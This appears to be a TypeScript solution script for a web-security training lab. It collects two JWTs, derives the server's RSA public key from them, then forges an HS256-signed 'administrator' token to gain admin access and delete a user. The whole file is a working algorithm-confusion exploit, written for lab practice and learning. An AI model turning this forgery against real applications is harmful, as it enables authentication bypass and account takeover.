import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
import { runTasks } from "../../../utils/runTasks.js";
import { JWT } from "../utils/JWT.js";
import { myCredentials } from "../../../config/credentials.js";
import { extractCsrfToken } from "../../../utils/extractCsrfToken.js";
import { extractCookie } from "../../../utils/extractCookie.js";
import { spawnSync } from "node:child_process";
import { sleep } from "../../../utils/sleep.js";
import { pressEnterToContinue } from "../../../utils/pressEnterToContinue.js";

const { labUrl, httpClient } = getParsedInputFromUser({
  description:
    "Lab: JWT authentication bypass via algorithm confusion with no exposed key",
  allowProxy: true,
});

await pressEnterToContinue(`
This lab runs Python code in addition to Node.js code. You need a Python interpreter, and you need to create and activate 
a virtual environment, then install the required packages. This can be done using Pip or Poetry package managers. 
For example,
With Pip: 
"python -m venv venv; .\\venv\\Scripts\\Activate.ps1; pip install -r requirements.txt" - Windows (PowerShell)
"python -m venv venv; source venv/bin/activate; pip install -r requirements.txt" - Linux and MacOS 

With Poetry: "poetry install; poetry shell"

Then run the lab.tsx as usual.`);

runTasks([task]);

async function task() {
  console.log(`
To solve the lab:
  1. Edit your browser cookie for the lab site with key "session" and value "${await createAdminJwtSignedWithPublicKey()}"
  2. Go to admin page:
  "${labUrl}admin"
  3. Delete carlos's account
`);
}

async function createAdminJwtSignedWithPublicKey() {
  console.log("Getting JWTs to derive the public key from...");
  const jwt1 = await getJwtFromLogin();
  // Prevent the server from providing the same JWT on the second login
  await sleep(500);
  const jwt2 = await getJwtFromLogin();
  console.log("Deriving public key from JWTs. This may take a while...");
  const publicKey = derivePublicKey(jwt1, jwt2);
  const header = { alg: "HS256" };
  const payload = { sub: "administrator" };
  return new JWT({ header, payload }).sign(publicKey);
}

async function getJwtFromLogin() {
  const getLoginResponse = await httpClient.get(labUrl + "login");
  const csrf = extractCsrfToken(getLoginResponse.data);
  const postLoginResponse = await httpClient.post(
    labUrl + "login",
    new URLSearchParams({
      csrf,
      username: myCredentials.username,
      password: myCredentials.password,
    }),
  );
  return extractCookie(postLoginResponse, "session").value;
}

function derivePublicKey(jwt1: string, jwt2: string) {
  const python = spawnSync("python", ["derive_public_key.py", jwt1, jwt2]);
  if (python.status !== 0) {
    throw new Error(python.stderr.toString("utf8"));
  }
  return python.stdout.toString("ascii").replaceAll("\r\n", "\n");
}
